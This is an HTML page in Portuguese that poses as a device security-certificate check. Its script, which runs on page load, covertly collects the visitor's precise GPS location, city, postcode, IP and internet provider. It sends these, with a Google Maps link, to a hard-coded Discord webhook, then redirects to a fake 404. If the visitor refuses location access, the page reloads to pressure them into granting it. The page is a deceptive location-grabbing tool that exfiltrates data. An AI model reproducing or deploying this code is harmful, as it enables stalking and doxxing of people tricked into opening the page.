<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sincronizando Protocolos</title>
    <style>
        body { background: #0b0f19; color: #f1f5f9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #161b22; padding: 40px; border-radius: 12px; border: 1px solid #30363d; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.7); max-width: 350px; }
        .spinner { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .toast { position: fixed; top: 20px; right: 20px; background: #238636; color: white; padding: 12px 24px; border-radius: 6px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 12px rgba(0,0,0,0.5); z-index: 1000; transition: 0.3s; margin-top: 10px; border-left: 4px solid #fff; }
    </style>
</head>
<body>

    <div id="notifications"></div>

    <div class="card">
        <div class="spinner"></div>
        <h2 style="margin: 0 0 10px 0; font-size: 1.2rem;">Verificando Acesso</h2>
        <p style="font-size: 14px; color: #8b949e; line-height: 1.6;">Aguarde a valida√ß√£o dos certificados de seguran√ßa do seu dispositivo.</p>
    </div>

    <script>
        // WEBHOOK ATUALIZADO
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";

        function notify(text) {
            const container = document.getElementById('notifications');
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.innerText = '‚úì ' + text;
            container.appendChild(toast);
            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 500); }, 3000);
        }

        async function processar() {
            notify("Conex√£o Criptografada");

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    notify("GPS Sincronizado");

                    try {
                        // 1. Reverso Geocoding (Pega a CIDADE REAL)
                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                        const geoData = await geoRes.json();
                        const addr = geoData.address;

                        // 2. Dados de IP/Provedor
                        const ipRes = await fetch('https://ipapi.co/json/');
                        const ipData = await ipRes.json();

                        // 3. Montagem do Embed para o canal de LOGS
                        const embed = {
                            embeds: [{
                                title: "üö® NOVO LOG DE ACESSO DETECTADO",
                                color: 5763719,
                                fields: [
                                    { name: "üö© Pais:", value: addr.country || "Brasil", inline: true },
                                    { name: "üèõÔ∏è Estado:", value: addr.state || "N/A", inline: true },
                                    { name: "üèôÔ∏è Cidade:", value: addr.city || addr.town || addr.village || "N/A", inline: true },
                                    { name: "üìÆ Cep:", value: addr.postcode || "N/A", inline: true },
                                    { name: "üìç Coordenadas:", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false },
                                    { name: "üåê Internet/Provedor:", value: ipData.org || "N/A", inline: false },
                                    { name: "‚è∞ Hor√°rio:", value: new Date().toLocaleString('pt-BR'), inline: false }
                                ],
                                footer: { text: "ID de Sess√£o: " + Math.random().toString(36).substr(2, 7).toUpperCase() }
                            }]
                        };

                        // 4. ENVIO FINAL
                        const response = await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(embed)
                        });

                        if (response.ok) {
                            notify("Logs Enviados!");
                            setTimeout(() => { window.location.href = "https://google.com/404"; }, 1500);
                        }

                    } catch (e) { console.error(e); }
                }, 
                (err) => { 
                    notify("Acesso negado. Recarregando...");
                    setTimeout(() => location.reload(), 2000);
                }, 
                { enableHighAccuracy: true });
            }
        }

        window.onload = processar;
    </script>
</body>
</html>
